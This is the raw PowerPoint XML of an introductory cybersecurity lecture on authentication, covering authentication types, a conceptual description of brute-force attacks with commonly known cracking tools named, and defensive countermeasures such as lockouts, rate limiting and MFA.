            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Block </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>suspicious domains &amp; ads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> with web filters.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>browser sandboxing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> to reduce damage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>reputation-based URL filtering</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Encourage checking URLs before clicking.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>endpoint security solutions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>zero-trust principles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> (verify all interactions).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="220179768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4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D4AEA93-B45D-C658-A60F-6ED845F9FE86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="709613" y="1443038"/>
            <a:ext cx="8434387" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Unit3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Authentication &amp; Authorization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="327365616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53236-7B02-AFF0-C11F-141F3D5DDBE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>User Authentication</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{395F71A9-E212-24D6-D41B-B394E2DF9D06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800"/>
              <a:t>· </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1"/>
              <a:t>Authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>is the process of verifying the identity of a user before granting access to a system, application, or data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  It ensures that only the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>right person</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> is accessing the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>right resources</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Example: When you log in to Gmail, it checks if the username and password really belong to you.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Key Concepts:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Identification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>: Who you claim to be (username/email)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>: Proving your identity (password/2FA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Authorization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>: What you're allowed to do (permissions)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="341082168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7D454-2C69-85BD-FE73-67A6829E2435}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Types of Authentication</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF7E1ACB-98C7-D24B-106E-3F8D3073F728}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>a) Single-Factor Authentication (SFA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>one method</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> only (e.g., password).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Simple but weak — if the password is stolen, account is compromised.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>b) Two-Factor Authentication (2FA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>two different methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (e.g., password + OTP sent to phone).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Adds extra security beyond just a password.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>c) Multi-Factor Authentication (MFA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>two or more different categories</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Something you know → password, PIN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Something you have → OTP token, smart card</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Something you are → fingerprint, face recognition</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Strongest form of authentication.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13547952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AE76D-B942-CE72-B481-A053B5BC6D0B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Brute Force</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0214631E-F6C4-A2F6-F3C7-2D68B36567ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Attacker systematically tries all possible username–password combinations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Time-consuming, but guaranteed to succeed if no protections exist.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Automated using tools like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Hydra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Burp Suite Intruder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>John the Ripper</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  More feasible on accounts with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>weak passwords</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Often targets authentication forms, SSH, FTP, or Wi-Fi networks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Can be distributed (many machines working together → Distributed Brute Force).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Detectable by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>multiple failed login attempts in short time</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Used as a base method when no password policies are enforced.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="179443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8DEE6-659D-74CB-B884-4C7F6DA35B93}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example of a Brute Force Attack in Python</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D16988B4-0060-008B-E7FD-DA98A449EC38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1618168" y="965036"/>
            <a:ext cx="5484876" cy="3832860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="77076111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59436-6BED-C732-14EC-333ACD1BD6E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Tools Used for Brute Force Attacks</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F388604-8929-1C69-7E89-6EA12C92ED32}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>- Hydra: A fast and flexible tool for network logins.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>- John the Ripper: Password cracking software supporting dictionary and brute force.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>Aircrack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>-ng: Focused on Wi-Fi password attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>Hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>: Advanced GPU-based password recovery tool.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="173333173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2D5C2-71A6-60E0-923D-6555D38C3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FB979E-ABAD-8C4C-B336-575BD445599A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9F6C5DBB-38A9-AE65-E5E0-0BB9EA5EFE15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>strong password policies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> (length, complexity).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>account lockouts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> after multiple failed attempts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>· Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>rate limiting / CAPTCHA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> to slow down automated attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>Multi-Factor Authentication (MFA)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> for extra security.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Monitor logs for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>suspicious repeated login attempts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Employ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>IP blocking / throttling</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> for suspicious activity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0" err="1"/>
              <a:t>passwordless</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t> authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> (e.g., biometrics, security keys).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19387686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1FB76-CE70-043A-FA47-5C48053B1506}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Dictionary Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D6AA9859-043B-3046-5DAF-CF8DA56C915F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
